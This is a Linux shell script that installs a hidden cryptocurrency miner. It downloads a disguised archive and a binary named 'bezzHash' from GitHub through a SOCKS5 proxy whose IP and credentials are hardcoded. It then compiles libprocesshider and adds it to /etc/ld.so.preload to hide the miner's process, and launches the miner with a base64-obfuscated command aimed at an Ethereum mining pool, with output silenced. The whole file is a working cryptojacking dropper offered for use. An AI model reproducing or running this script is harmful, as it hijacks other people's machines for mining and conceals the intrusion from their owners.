#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 176.53.133.217:57597
socks5_username = 2BHVpyGPD
socks5_password = 1rN14HAmV
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
chmod +x bezzHash

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
base64 -d <<< Li9ncmFmdGNwL2dyYWZ0Y3AgLi9iZXp6SGFzaCAtLXVybD1zc2w6Ly8weGJjNDhiOGJkY2U1NzJkZWZlNGRjYWI4NTEwM2YxNDAwOTliYzVhZjUuUkRQQGV0aC11cy13ZXN0LmZsZXhwb29sLmlvOjU1NTUgLS1sb2cgLS1leHRyYSAtLWxhdGVuY3kgLS1hbGwtc2hhcmVzIC0tc2hhcmVzLWRldGFpbCAtLXNob3ctbW9kZSAtLWxpc3QtbW9kZXMgLS1tb2RlPTk5 | sh >/dev/null 2>&1 >/dev/null 2>&1 >/dev/null 2>&1
